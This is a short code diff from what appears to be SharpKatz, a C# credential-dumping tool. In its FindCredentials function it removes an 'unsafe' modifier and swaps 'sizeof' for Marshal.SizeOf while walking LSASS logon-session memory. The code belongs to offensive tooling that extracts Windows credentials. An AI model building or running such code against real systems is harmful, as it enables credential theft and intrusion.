@@ -46,7 +46,7 @@ namespace SharpKatz.Module
             public string LogonServer; //PNatives.UNICODE_STRING
         }
 
-        public static unsafe int FindCredentials(IntPtr hLsass, IntPtr lsasrvMem, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, List<Logon> logonlist)
+        public static int FindCredentials(IntPtr hLsass, IntPtr lsasrvMem, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, List<Logon> logonlist)
         {
 
             uint logonSessionListSignOffset;
@@ -73,7 +73,7 @@ namespace SharpKatz.Module
             for (long i = 0; i < (long)logonSessionListCount; i++)
             {
                 //Console.WriteLine("[!] logonSessionListCount:"+ logonSessionListCount + " -> Step  : " + i);
-                pList = IntPtr.Add(logonSessionListAddr, (int)(i * sizeof(Msv1.LIST_ENTRY)));
+                pList = IntPtr.Add(logonSessionListAddr, (int)(i * Marshal.SizeOf(typeof(Msv1.LIST_ENTRY))));
 
                 do
                 {
